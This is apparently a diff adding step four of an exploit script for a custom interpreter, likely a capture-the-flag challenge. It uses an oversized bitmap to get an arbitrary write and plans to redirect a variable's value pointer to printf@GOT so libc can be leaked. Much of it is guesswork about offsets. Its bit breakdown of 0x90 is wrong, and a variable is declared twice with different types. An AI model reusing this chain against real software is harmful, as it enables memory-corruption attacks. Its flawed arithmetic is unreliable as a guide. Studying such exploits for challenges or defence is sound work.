@@ -1,0 +1,56 @@
+print("=== Step 4: Corrupt value_ptr to printf@GOT ===");
+
+print("Prerequisites:");
+print("1. targetaddr = leaked string address");
+print("2. entry_addr = targetaddr - offset (need to find)");
+print("3. bitmap_data_ptr = bitmap buffer address (need to find)");
+
+int target = 0;
+string target = "target";
+int targetaddr = target;
+print("targetaddr:");
+print(targetaddr);
+
+print("Creating bitmap for arbitrary write");
+bitmap b1 = create(9223372036854775807, 2);
+
+print("=== Step 4a: Finding addresses ===");
+print("Variable entry is typically 0x200-0x400 bytes before string");
+print("Let's try common offsets:");
+
+print("Option 1: entry_addr = targetaddr - 0x200");
+print("Option 2: entry_addr = targetaddr - 0x300");
+print("Option 3: entry_addr = targetaddr - 0x400");
+
+print("value_ptr = entry_addr + 0x28");
+
+print("=== Step 4b: Bitmap buffer address ===");
+print("bitmap_data_ptr is allocated after variables");
+print("Estimated: bitmap_data_ptr ≈ targetaddr + 0x1000");
+
+print("=== Step 4c: Calculate coordinates ===");
+print("For printf@GOT = 0x409048:");
+print("We need to write this 64-bit value bit-by-bit");
+
+print("0x409048 in bytes (little-endian):");
+print("Byte 0: 0x48 = 0b01001000 (bits 3, 6)");
+print("Byte 1: 0x90 = 0b10010000 (bits 0, 3, 4)");
+print("Byte 2: 0x40 = 0b01000000 (bit 6)");
+print("Bytes 3-7: 0x00");
+
+print("=== Step 4d: Write bits ===");
+print("Once we have y and x calculated:");
+print("set(b1, x + 3, y, 1);   // Bit 3 of byte 0");
+print("set(b1, x + 6, y, 1);   // Bit 6 of byte 0");
+print("set(b1, x + 0, y + 1, 1); // Bit 0 of byte 1");
+print("set(b1, x + 3, y + 1, 1); // Bit 3 of byte 1");
+print("set(b1, x + 4, y + 1, 1); // Bit 4 of byte 1");
+print("set(b1, x + 6, y + 2, 1); // Bit 6 of byte 2");
+
+print("Note: This is simplified - need to account for");
+print("bit positions across 8 bytes (64 bits total)");
+
+print("=== After Step 4 ===");
+print("target's value_ptr should now point to printf@GOT");
+print("Next: Read libc address (Step 5)");
+
